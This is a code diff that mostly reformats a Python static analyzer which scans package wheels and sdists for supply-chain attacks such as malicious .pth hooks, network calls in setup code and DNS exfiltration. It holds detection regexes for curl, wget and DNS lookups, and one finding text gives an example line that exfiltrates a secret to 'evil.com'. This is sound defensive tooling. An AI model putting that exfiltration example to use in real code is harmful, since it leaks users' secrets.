@@ -7,6 +7,7 @@ Design principles:
   3. Defense against malicious wheels (zip bombs, path traversal)
   4. Layered: structural checks → .pth semantic analysis → AST deep scan
 """
+
 from __future__ import annotations
 
 import ast
@@ -16,16 +17,17 @@ import re
 import zipfile
 from dataclasses import dataclass
 from pathlib import Path
-from typing import Optional
 
-from chaincanary.models import Finding, Severity
+from chaincanary.analyzer.pth_analyzer import (
+    analyze_pth_content,
+    pth_severity_from_analysis,
+)
 from chaincanary.analyzer.rules import STATIC_RULES
-from chaincanary.analyzer.pth_analyzer import analyze_pth_content, PthClass, pth_severity_from_analysis
-
+from chaincanary.models import Finding, Severity
 
 # ── Safety limits (prevents zip-bomb / resource exhaustion attacks) ────────
 MAX_FILES_IN_WHEEL = 50_000
-MAX_SINGLE_FILE_BYTES = 50 * 1024 * 1024   # 50 MB
+MAX_SINGLE_FILE_BYTES = 50 * 1024 * 1024  # 50 MB
 MAX_TOTAL_UNCOMPRESSED = 500 * 1024 * 1024  # 500 MB
 
 
@@ -40,8 +42,8 @@ _NETWORK_PATTERNS = [
     r"\baiohttp\s*\.",
     r"\bhttp\.client\b",
     r"\bsocket\.connect\b",
-    r"\bsocket\.getaddrinfo\b",   # DNS exfil: encode data in hostname
-    r"\bsocket\.gethostbyname\b", # DNS exfil variant
+    r"\bsocket\.getaddrinfo\b",  # DNS exfil: encode data in hostname
+    r"\bsocket\.gethostbyname\b",  # DNS exfil variant
     r"\burlopen\s*\(",
     r"\burlretrieve\s*\(",
 ]
@@ -83,8 +85,8 @@ _CURL_WGET = [r"\bcurl\s", r"\bwget\s"]
 _DNS_EXFIL_PATTERNS = [
     r"socket\.getaddrinfo\s*\(",
     r"socket\.gethostbyname\s*\(",
-    r"dns\.resolver\.",          # dnspython
-    r"resolve\s*\(.*\..*\.",     # generic DNS resolve with dynamic hostname
+    r"dns\.resolver\.",  # dnspython
+    r"resolve\s*\(.*\..*\.",  # generic DNS resolve with dynamic hostname
 ]
 
 # sys.modules indirect access (bypasses import name detection)
@@ -99,7 +101,7 @@ _NETWORK_ANY_FILE = [
     r"\brequests\.get\s*\(",
     r"\brequests\.post\s*\(",
     r"\bhttpx\.get\s*\(",
-    r"\bsocket\.getaddrinfo\s*\(",    # DNS exfil
+    r"\bsocket\.getaddrinfo\s*\(",  # DNS exfil
     r"\bsocket\.gethostbyname\s*\(",  # DNS exfil
 ]
 
@@ -128,11 +130,12 @@ def _matches_any(text: str, patterns: list[str]) -> list[str]:
 
 # ── Zip safety ─────────────────────────────────────────────────────────────
 
+
 class WheelSecurityError(Exception):
     """Raised when a wheel file looks like a security trap."""
 
 
-def _safe_read_zip(zf: zipfile.ZipFile, name: str) -> Optional[bytes]:
+def _safe_read_zip(zf: zipfile.ZipFile, name: str) -> bytes | None:
     """
     Read a file from a zip, enforcing size limits.
     Returns None if the file exceeds limits.
@@ -143,7 +146,7 @@ def _safe_read_zip(zf: zipfile.ZipFile, name: str) -> Optional[bytes]:
     return zf.read(name)
 
 
-def _validate_wheel_safety(zf: zipfile.ZipFile) -> Optional[Finding]:
+def _validate_wheel_safety(zf: zipfile.ZipFile) -> Finding | None:
     """
     Check for zip-bomb and path traversal attacks.
     Returns a Finding if the wheel looks malicious, else None.
@@ -179,9 +182,9 @@ def _validate_wheel_safety(zf: zipfile.ZipFile) -> Optional[Finding]:
         return Finding(
             rule_id="WHEEL_OVERSIZED",
             severity=Severity.MEDIUM,
-            title=f"Wheel unpacks to {total // (1024*1024):,} MB",
+            title=f"Wheel unpacks to {total // (1024 * 1024):,} MB",
             description="Unusually large packages can indicate zip bombs.",
-            evidence=f"Total uncompressed: {total // (1024*1024):,} MB",
+            evidence=f"Total uncompressed: {total // (1024 * 1024):,} MB",
             source="static",
         )
 
@@ -189,6 +192,7 @@ def _validate_wheel_safety(zf: zipfile.ZipFile) -> Optional[Finding]:
 
 
 # ── AST deep visitor ────────────────────────────────────────────────────────
+
 
 @dataclass
 class ASTFindings:
@@ -245,9 +249,15 @@ class _DeepVisitor(ast.NodeVisitor):
         elif name in ("urlopen", "urlretrieve"):
             self.network_calls.append(f"{name}() at {loc}")
 
-        elif any(name.startswith(p) for p in (
-            "requests.", "httpx.", "aiohttp.", "urllib.request.",
-        )):
+        elif any(
+            name.startswith(p)
+            for p in (
+                "requests.",
+                "httpx.",
+                "aiohttp.",
+                "urllib.request.",
+            )
+        ):
             self.network_calls.append(f"{name}() at {loc}")
 
         elif name in ("system", "popen", "Popen"):
@@ -299,6 +309,7 @@ class _DeepVisitor(ast.NodeVisitor):
 
 # ── Main Analyzer ──────────────────────────────────────────────────────────
 
+
 class StaticAnalyzer:
     """
     Deep static analysis — no Docker required.
@@ -322,14 +333,16 @@ class StaticAnalyzer:
         file_hash = _sha256_file(wheel_path)
         if file_hash in _MALICIOUS_HASHES:
             rule = STATIC_RULES["KNOWN_MALICIOUS_HASH"]
-            findings.append(Finding(
-                rule_id=rule.rule_id,
-                severity=rule.severity,
-                title=rule.title,
-                description=rule.description,
-                evidence=f"SHA256: {file_hash}",
-                source="static",
-            ))
+            findings.append(
+                Finding(
+                    rule_id=rule.rule_id,
+                    severity=rule.severity,
+                    title=rule.title,
+                    description=rule.description,
+                    evidence=f"SHA256: {file_hash}",
+                    source="static",
+                )
+            )
 
         # ── 2. Open and validate zip ───────────────────────────────
         try:
@@ -370,13 +383,15 @@ class StaticAnalyzer:
         for pth_name in (n for n in names if n.endswith(".pth")):
             raw = _safe_read_zip(zf, pth_name)
             if raw is None:
-                findings.append(Finding(
-                    rule_id="PTH_OVERSIZED",
-                    severity=Severity.HIGH,
-                    title=f".pth file exceeds size limit: {pth_name}",
-                    description="A .pth file larger than 50MB is extremely suspicious.",
-                    source="static",
-                ))
+                findings.append(
+                    Finding(
+                        rule_id="PTH_OVERSIZED",
+                        severity=Severity.HIGH,
+                        title=f".pth file exceeds size limit: {pth_name}",
+                        description="A .pth file larger than 50MB is extremely suspicious.",
+                        source="static",
+                    )
+                )
                 continue
 
             content = raw.decode("utf-8", errors="replace")
@@ -389,59 +404,61 @@ class StaticAnalyzer:
 
             elif severity_str == "LOW":
                 # Runs code but no external data flow (e.g., setuptools shim)
-                findings.append(Finding(
-                    rule_id="PTH_CODE_EXECUTION",
-                    severity=Severity.LOW,
-                    title=f".pth file runs code on Python startup: {pth_name}",
-                    description=(
-                        "This .pth file executes Python code on every interpreter startup. "
-                        "No external data flow detected — likely legitimate (e.g., coverage, setuptools). "
-                        "Verify the code is expected for this package."
-                    ),
-                    evidence=(
-                        f"File: {pth_name}\n"
-                        f"Safe signals: {analysis.safe_signals}\n"
-                        f"Content: {content[:200]}"
-                    ),
-                    source="static",
-                ))
+                findings.append(
+                    Finding(
+                        rule_id="PTH_CODE_EXECUTION",
+                        severity=Severity.LOW,
+                        title=f".pth file runs code on Python startup: {pth_name}",
+                        description=(
+                            "This .pth file executes Python code on every interpreter startup. "
+                            "No external data flow detected — likely legitimate (e.g., coverage, setuptools). "
+                            "Verify the code is expected for this package."
+                        ),
+                        evidence=(
+                            f"File: {pth_name}\n"
+                            f"Safe signals: {analysis.safe_signals}\n"
+                            f"Content: {content[:200]}"
+                        ),
+                        source="static",
+                    )
+                )
 
             else:
                 # DANGEROUS: external data flow
                 rule = STATIC_RULES["PTH_FILE_INSTALL"]
-                findings.append(Finding(
-                    rule_id="PTH_FILE_INSTALL",
-                    severity=Severity.CRITICAL,
-                    title=".pth file installs dangerous code that runs on every Python startup",
-                    description=(
-                        "This .pth file executes code with external data flow "
-                        "(network calls, subprocess, or credential access) on every "
-                        "Python interpreter startup. "
-                        "This is the exact mechanism used in the LiteLLM 1.82.7 attack."
-                    ),
-                    evidence=(
-                        f"File: {pth_name}\n"
-                        f"Risk: {explanation}\n"
-                        f"Content: {content[:300]}"
-                    ),
-                    source="static",
-                ))
-                # Additional findings per risk signal
-                findings.extend(
-                    self._pth_detail_findings(pth_name, content, analysis)
+                findings.append(
+                    Finding(
+                        rule_id="PTH_FILE_INSTALL",
+                        severity=Severity.CRITICAL,
+                        title=".pth file installs dangerous code that runs on every Python startup",
+                        description=(
+                            "This .pth file executes code with external data flow "
+                            "(network calls, subprocess, or credential access) on every "
+                            "Python interpreter startup. "
+                            "This is the exact mechanism used in the LiteLLM 1.82.7 attack."
+                        ),
+                        evidence=(
+                            f"File: {pth_name}\nRisk: {explanation}\nContent: {content[:300]}"
+                        ),
+                        source="static",
+                    )
                 )
+                # Additional findings per risk signal
+                findings.extend(self._pth_detail_findings(pth_name, content, analysis))
 
         # sitecustomize.py
         for sf in (n for n in names if "sitecustomize" in n.lower()):
             rule = STATIC_RULES["SITECUSTOMIZE_MODIFY"]
-            findings.append(Finding(
-                rule_id=rule.rule_id,
-                severity=rule.severity,
-                title=rule.title,
-                description=rule.description,
-                evidence=f"File: {sf}",
-                source="static",
-            ))
+            findings.append(
+                Finding(
+                    rule_id=rule.rule_id,
+                    severity=rule.severity,
+                    title=rule.title,
+                    description=rule.description,
+                    evidence=f"File: {sf}",
+                    source="static",
+                )
+            )
 
         return findings
 
@@ -455,29 +472,31 @@ class StaticAnalyzer:
         findings = []
 
         if any("network" in sig or "call" in sig for sig in analysis.risk_signals):
-            findings.append(Finding(
-                rule_id="PTH_NETWORK_BEACON",
-                severity=Severity.CRITICAL,
-                title=".pth file makes network call on every Python startup (phone-home)",
-                description=(
-                    "The .pth file contains network code that phones home "
-                    "on every Python interpreter start — classic beacon/exfiltration pattern."
-                ),
-                evidence=f"File: {pth_name}\nSignals: {analysis.risk_signals}\nContent: {content[:200]}",
-                source="static",
-            ))
+            findings.append(
+                Finding(
+                    rule_id="PTH_NETWORK_BEACON",
+                    severity=Severity.CRITICAL,
+                    title=".pth file makes network call on every Python startup (phone-home)",
+                    description=(
+                        "The .pth file contains network code that phones home "
+                        "on every Python interpreter start — classic beacon/exfiltration pattern."
+                    ),
+                    evidence=f"File: {pth_name}\nSignals: {analysis.risk_signals}\nContent: {content[:200]}",
+                    source="static",
+                )
+            )
 
         if any("subprocess" in sig or "shell" in sig for sig in analysis.risk_signals):
-            findings.append(Finding(
-                rule_id="PTH_SUBPROCESS",
-                severity=Severity.CRITICAL,
-                title=".pth file spawns subprocess on every Python startup",
-                description=(
-                    "The .pth file runs shell commands on every Python startup."
-                ),
-                evidence=f"File: {pth_name}\nContent: {content[:200]}",
-                source="static",
-            ))
+            findings.append(
+                Finding(
+                    rule_id="PTH_SUBPROCESS",
+                    severity=Severity.CRITICAL,
+                    title=".pth file spawns subprocess on every Python startup",
+                    description=("The .pth file runs shell commands on every Python startup."),
+                    evidence=f"File: {pth_name}\nContent: {content[:200]}",
+                    source="static",
+                )
+            )
 
         return findings
 
@@ -509,63 +528,73 @@ class StaticAnalyzer:
             obs = _matches_any(code, _OBFUSCATION_PATTERNS)
             if obs:
                 rule = STATIC_RULES["OBFUSCATED_CODE"]
-                findings.append(Finding(
-                    rule_id=rule.rule_id,
-                    severity=rule.severity,
-                    title=rule.title,
-                    description=rule.description,
-                    evidence=f"File: {py_file}\nPatterns matched: {obs[:3]}",
-                    source="static",
-                ))
+                findings.append(
+                    Finding(
+                        rule_id=rule.rule_id,
+                        severity=rule.severity,
+                        title=rule.title,
+                        description=rule.description,
+                        evidence=f"File: {py_file}\nPatterns matched: {obs[:3]}",
+                        source="static",
+                    )
+                )
 
             if is_hook:
                 net = _matches_any(code, _NETWORK_PATTERNS)
                 if net:
                     rule = STATIC_RULES["NETWORK_IN_SETUP"]
-                    findings.append(Finding(
-                        rule_id=rule.rule_id,
-                        severity=rule.severity,
-                        title=rule.title,
-                        description=rule.description,
-                        evidence=f"File: {py_file}\nPatterns: {net[:3]}",
-                        source="static",
-                    ))
+                    findings.append(
+                        Finding(
+                            rule_id=rule.rule_id,
+                            severity=rule.severity,
+                            title=rule.title,
+                            description=rule.description,
+                            evidence=f"File: {py_file}\nPatterns: {net[:3]}",
+                            source="static",
+                        )
+                    )
 
                 sub = _matches_any(code, _SUBPROCESS_PATTERNS)
                 if sub:
                     rule = STATIC_RULES["SUBPROCESS_IN_SETUP"]
-                    findings.append(Finding(
-                        rule_id=rule.rule_id,
-                        severity=rule.severity,
-                        title=rule.title,
-                        description=rule.description,
-                        evidence=f"File: {py_file}\nPatterns: {sub[:3]}",
-                        source="static",
-                    ))
+                    findings.append(
+                        Finding(
+                            rule_id=rule.rule_id,
+                            severity=rule.severity,
+                            title=rule.title,
+                            description=rule.description,
+                            evidence=f"File: {py_file}\nPatterns: {sub[:3]}",
+                            source="static",
+                        )
+                    )
 
                 cw = _matches_any(code, _CURL_WGET)
                 if cw:
                     rule = STATIC_RULES["CURL_WGET_IN_SETUP"]
-                    findings.append(Finding(
-                        rule_id=rule.rule_id,
-                        severity=rule.severity,
-                        title=rule.title,
-                        description=rule.description,
-                        evidence=f"File: {py_file}\nPatterns: {cw}",
-                        source="static",
-                    ))
+                    findings.append(
+                        Finding(
+                            rule_id=rule.rule_id,
+                            severity=rule.severity,
+                            title=rule.title,
+                            description=rule.description,
+                            evidence=f"File: {py_file}\nPatterns: {cw}",
+                            source="static",
+                        )
+                    )
 
                 sp = _matches_any(code, _SENSITIVE_PATHS)
                 if sp:
                     rule = STATIC_RULES["SENSITIVE_PATH_WRITE"]
-                    findings.append(Finding(
-                        rule_id=rule.rule_id,
-                        severity=rule.severity,
-                        title=rule.title,
-                        description=rule.description,
-                        evidence=f"File: {py_file}\nPaths: {sp[:3]}",
-                        source="static",
-                    ))
+                    findings.append(
+                        Finding(
+                            rule_id=rule.rule_id,
+                            severity=rule.severity,
+                            title=rule.title,
+                            description=rule.description,
+                            evidence=f"File: {py_file}\nPaths: {sp[:3]}",
+                            source="static",
+                        )
+                    )
 
             # ── Delayed-trigger detection: __init__.py ────────────
             # Attackers can hide payloads in __init__.py to run on import
@@ -573,51 +602,57 @@ class StaticAnalyzer:
             if is_init:
                 net = _matches_any(code, _NETWORK_ANY_FILE)
                 if net:
-                    findings.append(Finding(
-                        rule_id="INIT_NETWORK_CALL",
-                        severity=Severity.MEDIUM,
-                        title="Network call in __init__.py (runs on every import)",
-                        description=(
-                            "__init__.py makes a network call that will execute "
-                            "every time the package is imported. Could be telemetry, "
-                            "beacon, or legitimate update check — review carefully."
-                        ),
-                        evidence=f"File: {py_file}\nPatterns: {net[:3]}",
-                        source="static",
-                    ))
+                    findings.append(
+                        Finding(
+                            rule_id="INIT_NETWORK_CALL",
+                            severity=Severity.MEDIUM,
+                            title="Network call in __init__.py (runs on every import)",
+                            description=(
+                                "__init__.py makes a network call that will execute "
+                                "every time the package is imported. Could be telemetry, "
+                                "beacon, or legitimate update check — review carefully."
+                            ),
+                            evidence=f"File: {py_file}\nPatterns: {net[:3]}",
+                            source="static",
+                        )
+                    )
 
                 # DNS exfiltration in __init__ — especially suspicious
                 dns = _matches_any(code, _DNS_EXFIL_PATTERNS)
                 if dns:
-                    findings.append(Finding(
-                        rule_id="DNS_EXFIL",
-                        severity=Severity.HIGH,
-                        title="Potential DNS exfiltration — encodes data in DNS hostname lookup",
-                        description=(
-                            "DNS-based exfiltration encodes stolen data (env vars, secrets) "
-                            "as subdomains of an attacker-controlled domain. "
-                            "It bypasses many firewalls because DNS traffic is rarely blocked. "
-                            "Example: socket.getaddrinfo(base64(secret)+'.evil.com', 80)"
-                        ),
-                        evidence=f"File: {py_file}\nPatterns: {dns[:3]}",
-                        source="static",
-                    ))
+                    findings.append(
+                        Finding(
+                            rule_id="DNS_EXFIL",
+                            severity=Severity.HIGH,
+                            title="Potential DNS exfiltration — encodes data in DNS hostname lookup",
+                            description=(
+                                "DNS-based exfiltration encodes stolen data (env vars, secrets) "
+                                "as subdomains of an attacker-controlled domain. "
+                                "It bypasses many firewalls because DNS traffic is rarely blocked. "
+                                "Example: socket.getaddrinfo(base64(secret)+'.evil.com', 80)"
+                            ),
+                            evidence=f"File: {py_file}\nPatterns: {dns[:3]}",
+                            source="static",
+                        )
+                    )
 
                 # sys.modules indirect access — bypasses import name detection
                 sysmod = _matches_any(code, _SYS_MODULES_PATTERNS)
                 if sysmod:
-                    findings.append(Finding(
-                        rule_id="SYS_MODULES_ACCESS",
-                        severity=Severity.MEDIUM,
-                        title="Indirect module access via sys.modules (bypasses static analysis)",
-                        description=(
-                            "Accessing modules via sys.modules[] is a technique to bypass "
-                            "import-based detection. Attackers use it to call network/exec "
-                            "functions without triggering 'import requests' style detection."
-                        ),
-                        evidence=f"File: {py_file}\nPatterns: {sysmod[:3]}",
-                        source="static",
-                    ))
+                    findings.append(
+                        Finding(
+                            rule_id="SYS_MODULES_ACCESS",
+                            severity=Severity.MEDIUM,
+                            title="Indirect module access via sys.modules (bypasses static analysis)",
+                            description=(
+                                "Accessing modules via sys.modules[] is a technique to bypass "
+                                "import-based detection. Attackers use it to call network/exec "
+                                "functions without triggering 'import requests' style detection."
+                            ),
+                            evidence=f"File: {py_file}\nPatterns: {sysmod[:3]}",
+                            source="static",
+                        )
+                    )
 
             # ── AST deep analysis for install hooks ───────────────
             if is_hook:
@@ -630,25 +665,29 @@ class StaticAnalyzer:
                     if ast_f.exec_calls or ast_f.eval_calls:
                         rule = STATIC_RULES["EXEC_IN_SETUP"]
                         calls = ast_f.exec_calls + ast_f.eval_calls
-                        findings.append(Finding(
-                            rule_id=rule.rule_id,
-                            severity=rule.severity,
-                            title=rule.title,
-                            description=rule.description,
-                            evidence=f"File: {py_file}\nCalls: {calls[:5]}",
-                            source="static",
-                        ))
+                        findings.append(
+                            Finding(
+                                rule_id=rule.rule_id,
+                                severity=rule.severity,
+                                title=rule.title,
+                                description=rule.description,
+                                evidence=f"File: {py_file}\nCalls: {calls[:5]}",
+                                source="static",
+                            )
+                        )
 
                     if ast_f.obfuscation:
                         rule = STATIC_RULES["OBFUSCATED_CODE"]
-                        findings.append(Finding(
-                            rule_id=rule.rule_id,
-                            severity=rule.severity,
-                            title=rule.title,
-                            description=rule.description,
-                            evidence=f"File: {py_file}\nObfuscation: {ast_f.obfuscation[:3]}",
-                            source="static",
-                        ))
+                        findings.append(
+                            Finding(
+                                rule_id=rule.rule_id,
+                                severity=rule.severity,
+                                title=rule.title,
+                                description=rule.description,
+                                evidence=f"File: {py_file}\nObfuscation: {ast_f.obfuscation[:3]}",
+                                source="static",
+                            )
+                        )
 
                 except SyntaxError:
                     pass
@@ -672,6 +711,7 @@ class StaticAnalyzer:
         findings = []
         try:
             import tarfile
+
             with tarfile.open(path, "r:gz") as tf:
                 for member in tf.getmembers():
                     if not member.name.endswith(".py"):
@@ -687,26 +727,30 @@ class StaticAnalyzer:
                         net = _matches_any(code, _NETWORK_PATTERNS)
                         if net:
                             rule = STATIC_RULES["NETWORK_IN_SETUP"]
-                            findings.append(Finding(
+                            findings.append(
+                                Finding(
+                                    rule_id=rule.rule_id,
+                                    severity=rule.severity,
+                                    title=rule.title,
+                                    description=rule.description,
+                                    evidence=f"File: {member.name}",
+                                    source="static",
+                                )
+                            )
+
+                    obs = _matches_any(code, _OBFUSCATION_PATTERNS)
+                    if obs:
+                        rule = STATIC_RULES["OBFUSCATED_CODE"]
+                        findings.append(
+                            Finding(
                                 rule_id=rule.rule_id,
                                 severity=rule.severity,
                                 title=rule.title,
                                 description=rule.description,
                                 evidence=f"File: {member.name}",
                                 source="static",
-                            ))
-
-                    obs = _matches_any(code, _OBFUSCATION_PATTERNS)
-                    if obs:
-                        rule = STATIC_RULES["OBFUSCATED_CODE"]
-                        findings.append(Finding(
-                            rule_id=rule.rule_id,
-                            severity=rule.severity,
-                            title=rule.title,
-                            description=rule.description,
-                            evidence=f"File: {member.name}",
-                            source="static",
-                        ))
+                            )
+                        )
 
         except Exception:
             pass
